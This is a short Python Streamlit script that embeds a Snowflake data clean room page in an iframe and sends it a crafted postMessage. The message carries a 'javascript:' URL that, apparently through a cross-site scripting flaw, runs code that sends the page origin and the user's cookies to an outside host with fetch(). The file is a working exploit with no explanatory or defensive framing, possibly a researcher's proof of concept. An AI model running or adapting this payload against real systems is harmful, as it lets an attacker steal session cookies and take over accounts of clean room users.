import streamlit as st

my_js = """
f.onload = () => f.contentWindow.postMessage({
  eventKey: "__SAMOOHA__NAVIGATE_TO_URL",
  data: { auth_url: "javascript:window.__XSSMARK='DCRXSS-cbb26430';document.title='DCRXSS-cbb26430';fetch('https://cli-dcr-xss-cbb26430.a.0xd0m7.xyz/xss?o='+encodeURIComponent(location.origin)+'&ck='+encodeURIComponent(document.cookie));void 0" }
}, "*");
"""
my_html = f"""
<iframe id=f src="https://cleanroom.c1.us-east-1.aws.app.snowflake.com/"></iframe>
<script>
{my_js}
</script>
"""

st.html(my_html)

